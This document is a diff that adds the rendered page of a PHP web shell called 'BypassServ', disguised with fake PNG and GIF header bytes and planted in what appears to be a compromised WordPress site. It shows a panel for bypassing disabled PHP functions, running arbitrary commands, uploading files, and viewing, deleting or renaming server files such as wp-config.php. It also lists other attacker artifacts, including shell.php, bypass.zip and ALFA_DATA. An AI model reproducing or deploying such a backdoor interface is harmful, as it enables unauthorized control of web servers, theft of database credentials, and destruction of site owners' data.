@@ -1,0 +1,474 @@
+
+‰PNG
+
+32759GIF89a;
+;; 
+<!DOCTYPE html>
+<html>
+<head>
+    <title>BypassServ By Sid Gifari</title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="googlebot" content="noindex">
+    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
+    <style>
+    body {
+        font-family: 'Arial Black', sans-serif;
+        color: #000;
+        margin: 0;
+        padding: 0;
+        background-color: #242222c9;
+    }
+    .result-box-container {
+        position: relative;
+        margin-top: 20px;
+    }
+
+    .result-box {
+        width: 100%;
+        height: 200px;
+        padding: 10px;
+        border: 1px solid #ddd;
+        border-radius: 5px;
+        background-color: #f4f4f4;
+        overflow: auto;
+        box-sizing: border-box;
+        font-family: 'Arial Black', sans-serif;
+        color: #333;
+    }
+
+    .result-box::placeholder {
+        color: #999;
+    }
+
+    .result-box:focus {
+        outline: none;
+        border-color: #000000;
+    }
+
+    .result-box::-webkit-scrollbar {
+        width: 8px;
+    }
+
+    .result-box::-webkit-scrollbar-thumb {
+        background-color: #000000;
+        border-radius: 4px;
+    }
+    .container {
+        max-width: 90%;
+        margin: 20px auto;
+        padding: 20px;
+        background-color: #ffffff;
+        border-radius: 44px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .header {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .header h1 {
+        font-size: 24px;
+    }
+    .subheader {
+        text-align: center;
+        margin-bottom: 20px;
+    }
+    .subheader p {
+        font-size: 16px;
+        font-style: italic;
+    }
+    form {
+        margin-bottom: 20px;
+    }
+    form input[type="text"],
+    form textarea {
+        padding: 8px;
+        margin-bottom: 10px;
+        border: 1px solid #000;
+        border-radius: 3px;
+        box-sizing: border-box;
+        
+    }
+    form input[type="submit"] {
+
+        padding: 10px;
+        background-color: #000000;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    form input[type="file"] {
+        padding: 7px;
+        background-color: #000000;
+        color: white;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer;
+    }
+    .result-box {
+            width: 100%;
+            height: 200px;
+            resize: none;
+            overflow: auto;
+            font-family: 'Arial Black';
+            background-color: #f4f4f4;
+            padding: 10px;
+            border: 1px solid #ddd;
+            margin-bottom: 10px;
+        }
+    form input[type="submit"]:hover {
+        background-color: #143015;
+    }
+    table {
+        width: 100%;
+        border-collapse: collapse;
+        margin-top: 20px;
+    }
+    th, td {
+        padding: 8px;
+        text-align: left;
+    }
+    th {
+        background-color: #5c5c5c;
+    }
+    tr:nth-child(even) {
+        background-color: #9c9b9bce;
+    }
+    .item-name {
+        max-width: 200px;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+    }
+    .size, .date {
+        width: 100px;
+    }
+    .permission {
+        font-weight: bold;
+        width: 50px;
+        text-align: center;
+    }
+    .writable {
+        color: #0db202;
+    }
+    .not-writable {
+        color: #d60909;
+    }
+textarea[name="file_content"] {
+            width: calc(100.9% - 10px);
+            margin-bottom: 10px;
+            padding: 8px;
+            max-height: 500px;
+            resize: vertical;
+            border: 1px solid #ddd;
+            border-radius: 3px;
+            font-family: 'Arial Black';
+        }
+</style>
+</head>
+<body>
+<div class="container">
+<font color='black'>[ Command Bypas Status Wajib ON MAIL PUTENV @ HaxorSec]</font><br><font color='black'>[ mail() :</font><font color='green'> [ ON ]</font> ] <font color='black'>[ mb_send_mail() :</font><font color='green'> [ ON ]</font> ] <font color='black'>[ error_log() :</font><font color='green'> [ ON ]</font> ] <font color='black'>[ imap_mail() :</font><font color='green'> [ ON ]</font> ]<font color='black'>[ Function putenv() ] :</font><font color='green'> [ ON ]</font><br><hr>DIR: /<a href="?d=Lw=="></a>/<a href="?d=Ly9ob21l">home</a>/<a href="?d=Ly9ob21lL2Frdmpya3Bx">akvjrkpq</a>/<a href="?d=Ly9ob21lL2Frdmpya3BxL3B1YmxpY19odG1s">public_html</a><a href="?d=Lg=="> / <span style="color: green;">[ GO Home ]</span></a><br><hr><form method="post" enctype="multipart/form-data"><hr><input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:"><input type="submit" value="Upload File" name="submit"></form><hr><table border="5"><tbody>
+<tr>
+<td>
+<center>Command BYPASS<form method="post" action="?">
+<input type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form></center></td>
+
+<td><center>Command BIASA<form method="post" action="?">
+<input type="text" name="cmd_biasa" placeholder="Enter command"><input type="submit" value="Run Command"></form><center></td>
+
+<td><center>Create Folder<form method="post" action="?">
+<input type="text" name="folder_name" placeholder="Folder Name"><input type="submit" value="Create Folder"></form><center></td>
+<td><center>Create File<form method="post" action="?">
+<input type="text" name="file_name" placeholder="File Name"><input type="submit" value="Create File"></form></td></tr>
+</tbody></table><table border=1><br><tr><th><center>Item Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvLg==">.</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2025-02-07 18:36:33</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="."><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="."><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="."><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvLi4=">..</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-09-08 04:04:28</td>
+            <td class="permission writable">0711</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value=".."><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value=".."><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value=".."><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=Lmh0YWNjZXNz">.htaccess</a></td>
+            <td class="size">344</td>
+            <td class="date" style="text-align: center;">2025-02-04 18:33:19</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value=".htaccess"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value=".htaccess"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value=".htaccess"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvLnRtYg==">.tmb</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:58:13</td>
+            <td class="permission writable">0777</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value=".tmb"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value=".tmb"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value=".tmb"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvLndlbGwta25vd24=">.well-known</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:58:13</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value=".well-known"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value=".well-known"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value=".well-known"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvQUxGQV9EQVRB">ALFA_DATA</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2025-01-09 09:59:59</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="ALFA_DATA"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="ALFA_DATA"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="ALFA_DATA"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=YWNwaWQuc29ja2V0">acpid.socket</a></td>
+            <td class="size">26</td>
+            <td class="date" style="text-align: center;">2025-01-18 14:58:30</td>
+            <td class="permission writable">0777</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="acpid.socket"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="acpid.socket"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="acpid.socket"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=YnlwYXNzLnppcA==">bypass.zip</a></td>
+            <td class="size">130447</td>
+            <td class="date" style="text-align: center;">2024-12-30 16:56:36</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="bypass.zip"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="bypass.zip"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="bypass.zip"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvY2dpLWJpbg==">cgi-bin</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:58:13</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="cgi-bin"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="cgi-bin"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="cgi-bin"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=ZXJyb3JfbG9n">error_log</a></td>
+            <td class="size">1428801</td>
+            <td class="date" style="text-align: center;">2025-02-07 18:34:40</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="error_log"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="error_log"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="error_log"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=aW5kZXgucGhw">index.php</a></td>
+            <td class="size">422</td>
+            <td class="date" style="text-align: center;">2025-01-18 14:56:24</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="index.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="index.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="index.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=bGljZW5zZS50eHQ=">license.txt</a></td>
+            <td class="size">19915</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:07:37</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="license.txt"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="license.txt"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="license.txt"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=cmVhZG1lLmh0bWw=">readme.html</a></td>
+            <td class="size">7409</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:06:58</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="readme.html"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="readme.html"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="readme.html"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=cm9ib3RzLnR4dA==">robots.txt</a></td>
+            <td class="size">903</td>
+            <td class="date" style="text-align: center;">2025-01-18 07:32:26</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="robots.txt"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="robots.txt"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="robots.txt"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvc2FhYQ==">saaa</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:59:16</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="saaa"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="saaa"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="saaa"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=c2hlbGwucGhw">shell.php</a></td>
+            <td class="size">52</td>
+            <td class="date" style="text-align: center;">2024-12-30 16:56:44</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="shell.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="shell.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="shell.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=c2l0ZW1hcC54bWw=">sitemap.xml</a></td>
+            <td class="size">935</td>
+            <td class="date" style="text-align: center;">2025-01-15 03:05:40</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="sitemap.xml"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="sitemap.xml"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="sitemap.xml"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=dGVzdC50eHQ=">test.txt</a></td>
+            <td class="size">309</td>
+            <td class="date" style="text-align: center;">2025-01-18 14:58:30</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="test.txt"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="test.txt"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="test.txt"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtYWN0aXZhdGUucGhw">wp-activate.php</a></td>
+            <td class="size">7387</td>
+            <td class="date" style="text-align: center;">2024-02-13 14:19:10</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-activate.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-activate.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-activate.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvd3AtYWRtaW4=">wp-admin</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:58:13</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-admin"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-admin"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-admin"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvd3AtYWRtaW4tLQ==">wp-admin--</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2024-12-30 05:58:13</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-admin--"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-admin--"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-admin--"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtYmxvZy1oZWFkZXIucGhw">wp-blog-header.php</a></td>
+            <td class="size">525</td>
+            <td class="date" style="text-align: center;">2025-01-15 03:01:23</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-blog-header.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-blog-header.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-blog-header.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtYmxvZy1oZWFkZXIxLnBocA==">wp-blog-header1.php</a></td>
+            <td class="size">495</td>
+            <td class="date" style="text-align: center;">2020-02-06 06:33:12</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-blog-header1.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-blog-header1.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-blog-header1.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtY29tbWVudHMtcG9zdC5waHA=">wp-comments-post.php</a></td>
+            <td class="size">2323</td>
+            <td class="date" style="text-align: center;">2023-06-14 14:11:16</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-comments-post.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-comments-post.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-comments-post.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtY29uZmlnLXNhbXBsZS5waHA=">wp-config-sample.php</a></td>
+            <td class="size">3336</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:06:58</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-config-sample.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-config-sample.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-config-sample.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtY29uZmlnLnBocA==">wp-config.php</a></td>
+            <td class="size">3294</td>
+            <td class="date" style="text-align: center;">2024-08-21 13:07:24</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-config.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-config.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-config.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvd3AtY29udGVudA==">wp-content</a></td>
+            <td class="size">4096</td>
+            <td class="date" style="text-align: center;">2025-02-07 18:36:26</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-content"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-content"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-content"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtY3Jvbi5waHA=">wp-cron.php</a></td>
+            <td class="size">5617</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:06:58</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-cron.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-cron.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-cron.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWwvd3AtaW5jbHVkZXM=">wp-includes</a></td>
+            <td class="size">12288</td>
+            <td class="date" style="text-align: center;">2025-02-07 18:33:31</td>
+            <td class="permission writable">0755</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-includes"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-includes"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-includes"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtbGlua3Mtb3BtbC5waHA=">wp-links-opml.php</a></td>
+            <td class="size">2502</td>
+            <td class="date" style="text-align: center;">2022-11-26 21:01:18</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-links-opml.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-links-opml.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-links-opml.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtbG9hZC5waHA=">wp-load.php</a></td>
+            <td class="size">3937</td>
+            <td class="date" style="text-align: center;">2024-03-11 10:05:16</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-load.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-load.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-load.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtbWFpbC5waHA=">wp-mail.php</a></td>
+            <td class="size">8543</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:07:37</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-mail.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-mail.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-mail.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3Atc2V0dGluZ3MucGhw">wp-settings.php</a></td>
+            <td class="size">29032</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:07:31</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-settings.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-settings.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-settings.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3Atc2lnbnVwLnBocA==">wp-signup.php</a></td>
+            <td class="size">34385</td>
+            <td class="date" style="text-align: center;">2023-06-19 18:27:28</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-signup.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-signup.php"><input type="submit" value="Delete"></form></center></td>
+            <td><form method="post" action="?"><input type="hidden" name="old_name" value="wp-signup.php"><input type="text" name="new_name" placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
+        </tr><tr>
+            <td class="item-name"><a href="?d=L2hvbWUvYWt2anJrcHEvcHVibGljX2h0bWw=&f=d3AtdHJhY2tiYWNrLnBocA==">wp-trackback.php</a></td>
+            <td class="size">5102</td>
+            <td class="date" style="text-align: center;">2024-12-30 07:06:58</td>
+            <td class="permission writable">0644</td>
+            <td><center><form method="post" action="?"><input type="hidden" name="view_file" value="wp-trackback.php"><input type="submit" value=" View "></form></center></td>
+            <td><center><form method="post" action="?"><input type="hidden" name="delete_file" value="wp-trackback.php"><input type="submit" value="Delete"></form></center></td>
